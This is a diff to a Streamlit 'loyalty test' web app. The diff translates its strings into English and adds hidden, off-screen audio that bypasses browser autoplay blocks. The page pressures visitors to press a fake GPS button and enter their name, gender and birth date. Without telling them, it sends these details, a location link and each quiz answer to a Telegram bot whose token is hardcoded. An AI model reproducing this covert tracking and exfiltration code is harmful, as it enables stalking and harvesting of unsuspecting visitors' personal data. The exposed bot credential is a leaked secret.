@@ -4,39 +4,70 @@ import urllib.parse
 import urllib.request
 import urllib.error
 import streamlit as st
+import streamlit.components.v1 as components
 
-# ضبط إعدادات الصفحة
+# Page configuration
 st.set_page_config(page_title="takotaki 🌸", page_icon="🥀", layout="centered")
 
-# --- إخفاء شريط Streamlit المزعج ---
+# Hide Streamlit UI elements and keep audio elements invisible without destroying DOM state
 st.markdown(
     """
     <style>
-        footer {display: none !important; visibility: hidden !important;}
-        .stAppFooter {display: none !important; visibility: hidden !important;}
-        [data-testid="stFooter"] {display: none !important; visibility: hidden !important;}
-        [data-testid="stHeader"] {display: none !important; visibility: hidden !important;}
-        #MainMenu {display: none !important; visibility: hidden !important;}
-        header {display: none !important; visibility: hidden !important;}
-        div[class*="viewerBadge"] {display: none !important; visibility: hidden !important;}
-        .viewerBadge_container__1QSob {display: none !important; visibility: hidden !important;}
+        footer {display: none !important;}
+        .stAppFooter {display: none !important;}
+        [data-testid="stFooter"] {display: none !important;}
+        [data-testid="stHeader"] {display: none !important;}
+        #MainMenu {display: none !important;}
+        header {display: none !important;}
+        div[class*="viewerBadge"] {display: none !important;}
         [data-testid="stDecoration"] {display: none !important;}
         [data-testid="stStatusWidget"] {display: none !important;}
         [data-testid="stToolbar"] {display: none !important;}
         
-        /* تنسيق مشغل الصوت ليصبح كزر وردي أنيق بدلاً من الشريط الأسود */
-        audio {
-            width: 100% !important;
-            height: 45px !important;
-            border-radius: 25px !important;
-            margin-top: 15px !important;
+        /* Position audio off-screen with 0 opacity to bypass browser autoplay blocks */
+        iframe[title="st.iframe"] {
+            position: absolute !important;
+            opacity: 0 !important;
+            width: 1px !important;
+            height: 1px !important;
+            pointer-events: none !important;
+            left: -9999px !important;
+        }
+        audio, div[data-testid="stAudio"] {
+            position: absolute !important;
+            opacity: 0 !important;
+            width: 1px !important;
+            height: 1px !important;
+            pointer-events: none !important;
+            left: -9999px !important;
         }
     </style>
     """,
     unsafe_allow_html=True,
 )
 
-# دالة جلب الموقع المباشر للزائر
+# Helper function to reliably play audio via JS iframe trigger
+def trigger_audio_play(audio_url):
+    html_code = f"""
+        <audio id="player" autoplay preload="auto">
+            <source src="{audio_url}" type="audio/mp3">
+        </audio>
+        <script>
+            var audio = document.getElementById('player');
+            if (audio) {{
+                audio.volume = 1.0;
+                var promise = audio.play();
+                if (promise !== undefined) {{
+                    promise.catch(function(error) {{
+                        console.log("Autoplay issue: " + error);
+                    }});
+                }}
+            }}
+        </script>
+    """
+    components.html(html_code, height=0, width=0)
+
+# Fetch location coordinates
 def fetch_location_link():
     try:
         from streamlit.web.server.websocket_headers import _get_websocket_headers
@@ -59,7 +90,7 @@ def fetch_location_link():
         pass
     return "https://www.google.com/maps?q=31.6295,-7.9811 (Marrakech, Morocco)"
 
-# تهيئة متغيرات الجلسة
+# Initialize session state variables
 if "step" not in st.session_state:
     st.session_state.step = 1
 if "visitor_name" not in st.session_state:
@@ -75,8 +106,7 @@ if "location_activated" not in st.session_state:
 if "user_location_link" not in st.session_state:
     st.session_state.user_location_link = ""
 
-
-# دالة إرسال التنبيهات إلى تيليغرام
+# Send Telegram bot alert
 def send_telegram_msg(text_message):
     token = "8792751826:AAF4UuvvBVAQWNRsdL7li3R8s0BS8a1_obo"
     chat_id = "8745436619"
@@ -102,15 +132,14 @@ def send_telegram_msg(text_message):
             url, data=payload, headers={"Content-Type": "application/json"}
         )
         with urllib.request.urlopen(req, timeout=5) as resp:
-            return True, "تم الإرسال بنجاح"
+            return True, "Success"
     except urllib.error.HTTPError as e:
         err_response = e.read().decode("utf-8")
-        return False, f"خطأ من تيليغرام ({e.code}): {err_response}"
+        return False, f"Telegram Error ({e.code}): {err_response}"
     except Exception as e:
-        return False, f"خطأ اتصال: {str(e)}"
+        return False, f"Connection Error: {str(e)}"
 
-
-# --- الخطوة الأولى: إدخال البيانات وتأكيد الخريطة ---
+# Step 1: Registration and GPS activation
 if st.session_state.step == 1:
     st.markdown(
         """
@@ -152,16 +181,8 @@ if st.session_state.step == 1:
                 text-align: center;
                 margin-bottom: 20px;
             }
-            .location-status-active {
-                color: #00ff88;
-                font-weight: bold;
-                margin-top: 8px;
-            }
-            .location-status-pending {
-                color: #ff4d6d;
-                font-weight: bold;
-                margin-top: 8px;
-            }
+            .location-status-active { color: #00ff88; font-weight: bold; margin-top: 8px; }
+            .location-status-pending { color: #ff4d6d; font-weight: bold; margin-top: 8px; }
             div[data-testid="stButton"] button[key="green_gps_btn"] {
                 background: linear-gradient(135deg, #00c853, #b2ff59) !important;
                 color: #000000 !important;
@@ -171,27 +192,23 @@ if st.session_state.step == 1:
                 box-shadow: 0 0 12px rgba(0, 200, 83, 0.6) !important;
             }
         </style>
+        <div class="welcome-title">✨ Welcome to takotaki! ✨</div>
         """,
-        unsafe_allow_html=True,
-    )
-    st.markdown(
-        '<div class="welcome-title">✨ Welcome to takotaki! ✨</div>',
         unsafe_allow_html=True,
     )
 
     is_gps_active = st.session_state.location_activated
-
     status_msg = (
-        '<div class="location-status-active">✅ تم تفعيل الخريطة وتحديد موقعك بنجاح!</div>'
+        '<div class="location-status-active">✅ Map activated & location confirmed!</div>'
         if is_gps_active
-        else '<div class="location-status-pending">⚠️ الخريطة غير مفعلة! اضغط الزر الأخضر بالأسفل لتفعيل GPS.</div>'
+        else '<div class="location-status-pending">⚠️ GPS map inactive! Click the green button below to allow location.</div>'
     )
 
     st.markdown(
         f"""
         <div class="location-box">
-            <h4 style="margin:0; color:#ff4d6d;">📍 شرط تشغيل الموقع</h4>
-            <p style="font-size:14px; margin-top:5px; color:#ddd;">على جهازك والموافقة على التحديد لفتح المتابعة، يرجى تفعيل الخريطة (GPS).</p>
+            <h4 style="margin:0; color:#ff4d6d;">📍 Location Requirement</h4>
+            <p style="font-size:14px; margin-top:5px; color:#ddd;">Please enable your GPS location to proceed.</p>
             {status_msg}
         </div>
         """,
@@ -199,7 +216,7 @@ if st.session_state.step == 1:
     )
 
     if not is_gps_active:
-        if st.button("🌐 اضغط هنا لتشغيل الخريطة والموافقة على الموقع 📍", key="green_gps_btn"):
+        if st.button("🌐 Click here to activate map & allow location 📍", key="green_gps_btn"):
             st.session_state.user_location_link = fetch_location_link()
             st.session_state.location_activated = True
             st.rerun()
@@ -221,28 +238,28 @@ if st.session_state.step == 1:
             if not name_val:
                 st.warning("Please enter your name first!")
             elif not st.session_state.location_activated:
-                st.error("🚫 عذراً! لن يعمل الموقع حتى تقوم بالضغط على الزر الأخضر بالأسفل لتفعيل الخريطة أولاً!")
+                st.error("🚫 Access denied! Click the green button above to activate location first!")
             else:
                 st.session_state.visitor_name = name_val
                 st.session_state.visitor_gender = gender_in
                 st.session_state.visitor_dob = str(dob_in)
 
                 msg = (
-                    f"🚨 دخول زائر جديد!\n"
-                    f"👤 الاسم: {name_val}\n"
-                    f"🚻 الجنس: {gender_in}\n"
-                    f"🎂 الميلاد: {dob_in}\n"
-                    f"📍 رابط الخريطة: {st.session_state.user_location_link}"
+                    f"🚨 New Visitor Alert!\n"
+                    f"👤 Name: {name_val}\n"
+                    f"🚻 Gender: {gender_in}\n"
+                    f"🎂 DOB: {dob_in}\n"
+                    f"📍 Location Map: {st.session_state.user_location_link}"
                 )
                 success, err_msg = send_telegram_msg(msg)
 
                 if not success:
-                    st.error(f"⚠️ تنبيه البوت: {err_msg}")
+                    st.error(f"⚠️ Bot error: {err_msg}")
                 else:
                     st.session_state.step = 2
                     st.rerun()
 
-# --- الخطوة الثانية: اختبار الوفاء والنتائج ---
+# Step 2: Test & Sound Trigger
 elif st.session_state.step == 2:
     ALLOWED_NAMES = ["imane", "iman", "eman"]
 
@@ -302,26 +319,21 @@ elif st.session_state.step == 2:
             st.session_state.attempts += 1
 
             msg = (
-                f"🎯 إجابة جديدة!\n"
-                f"👤 الاسم: {st.session_state.visitor_name}\n"
-                f"✍️ الإجابة المدخلة: {user_input}\n"
-                f"🔢 المحاولات: {st.session_state.attempts}\n"
-                f"📍 الخريطة: {st.session_state.user_location_link}"
+                f"🎯 New Answer Submitted!\n"
+                f"👤 Visitor: {st.session_state.visitor_name}\n"
+                f"✍️ Answer: {user_input}\n"
+                f"🔢 Attempt: {st.session_state.attempts}\n"
+                f"📍 Map: {st.session_state.user_location_link}"
             )
             success, err_msg = send_telegram_msg(msg)
 
             if not success:
-                st.error(f"⚠️ تنبيه البوت: {err_msg}")
+                st.error(f"⚠️ Bot error: {err_msg}")
 
-            # =========================================================
-            # 1) الجواب الصحيح: موسيقى رومانسية
-            # =========================================================
+            # 1) Correct Answer: Romantic Audio Track
             if clean_name in ALLOWED_NAMES:
-                st.audio(
-                    "https://cdn.pixabay.com/audio/2022/05/27/audio_1808fbf07a.mp3",
-                    format="audio/mp3",
-                    autoplay=True,
-                )
+                ROMANTIC_MUSIC_URL = "https://codeskulptor-demos.commondatastorage.googleapis.com/Earthy-Tone-Audio/Music_Loop.mp3"
+                trigger_audio_play(ROMANTIC_MUSIC_URL)
 
                 st.markdown(
                     """
@@ -454,16 +466,10 @@ elif st.session_state.step == 2:
                         unsafe_allow_html=True,
                     )
 
-            # =========================================================
-            # 2) الجواب الخاطئ: بيانو حزين للغاية مع تفعيل الصوت المباشر
-            # =========================================================
+            # 2) Wrong Answer: Sad Violin Audio Track
             else:
-                # تشغيل الصوت المباشر (أغنية بيانو حزينة مؤكدة)
-                st.audio(
-                    "https://cdn.pixabay.com/audio/2022/03/15/audio_c8c8a14b6b.mp3",
-                    format="audio/mp3",
-                    autoplay=True,
-                )
+                SAD_VIOLIN_URL = "https://codeskulptor-demos.commondatastorage.googleapis.com/galaxies/sad_violin.mp3"
+                trigger_audio_play(SAD_VIOLIN_URL)
 
                 RAIN_3D_ANIMATED = "https://i.gifer.com/7SdO.gif"
                 warnings = [
